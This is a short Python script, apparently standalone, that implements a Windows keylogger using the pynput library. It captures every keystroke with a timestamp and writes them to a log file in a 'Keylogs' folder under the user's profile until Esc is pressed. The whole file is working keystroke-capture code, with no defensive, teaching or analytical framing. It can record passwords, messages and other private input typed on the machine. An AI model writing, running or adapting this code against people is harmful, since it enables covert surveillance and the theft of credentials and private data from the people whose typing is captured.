from pynput import keyboard
import time
import os
import getpass

# Get the username of the current user
username = getpass.getuser()

# Create a directory to save the keylogs
log_dir = f"C:\\Users\\{username}\\Keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Create a file to save the keylogs
log_file = f"{log_dir}\\keylog_{time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
file = open(log_file, "w")

# Define the on_press function to be called when a key is pressed
def on_press(key):
    try:
        # Convert the key to a string and append it to the file
        file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {key.char}\n")
    except AttributeError:
        # If the key is a special key (e.g. Shift, Ctrl, etc.), write its name
        file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {key}\n")
    file.flush()

# Define the on_release function to be called when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when the Esc key is pressed
        return False

# Start listening to the keyboard
print("Keylogger started. Press Esc to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Close the file
file.close()
print("Keylogger stopped.")